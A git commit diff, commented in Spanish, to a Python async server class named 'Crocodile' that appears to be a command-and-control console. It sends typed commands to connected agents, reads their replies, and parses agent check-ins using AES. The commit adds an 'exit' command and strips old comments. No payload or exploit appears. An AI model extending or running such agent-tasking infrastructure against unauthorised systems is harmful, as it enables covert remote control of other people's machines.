c810cdd3a23540643751fbcb60b9b84e21f409c8
JesusJs <jdchavezzss@gmail.com>
2025-02-16 17:51:09 -0500

    Tarea de implementar exit, para salir del cliente, implementada

--- core/server/commands/command.py
+++ core/server/commands/command.py
@@ -11,18 +11,17 @@ class Crocodile:
         self.encryptor = AESEncryptor(key)
         self.sessions = {}
 
-    async def start(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):  # ✅ StreamWriter
+    async def start(self, reader: asyncio.StreamReader, writer: asyncio.StreamWriter):
         if not isinstance(reader, asyncio.StreamReader):
             raise TypeError("reader debe ser una instancia de asyncio.StreamReader")
-        # resp = await reader.read(36)
         while True:
             try: 
                 command =  await self.get_input("#>: ")
-                #await asyncio.to_thread(input, resp.decode("utf-8", errors="replace") + " ")
+                if command.lower() == "exit":
+                    break
                 r = command.encode('utf-8')
                 writer.write(r)
-                # writer.drain()
-                resp = await reader.read(36)  # ✅ Esperar respuesta del cliente
+                resp = await reader.read(36)
                 if not resp:
                     print("🔴 El cliente cerró la conexión.")
                     break
@@ -30,18 +29,10 @@ class Crocodile:
                 print("Respuesta recibida:", resp.decode("utf-8", errors="replace"))
             except Exception as e:
                 print("ocurrio un error", e)
-        # encrypt = self.encryptor.encrypt(comand.decode())
-        # await writer.drain()
-        # # print(f"Enviado: {encrypt}")
         
-        # res = await reader.read(4096)
-        # if res:
-        #     print(res.decode())
-            # decrypted_response = await self.encryptor.decrypt(res)
-            # agent_id, command = await self.process_check_in(decrypted_response)
-            # print(agent_id, command.decode())
     async def get_input(self,prompt: str):
         return await asyncio.to_thread(input, prompt)
+
     async def process_check_in(self, data: str) -> tuple:
         """Procesa el check-in de un agente."""
         agent_id, metadata = data.split("|")
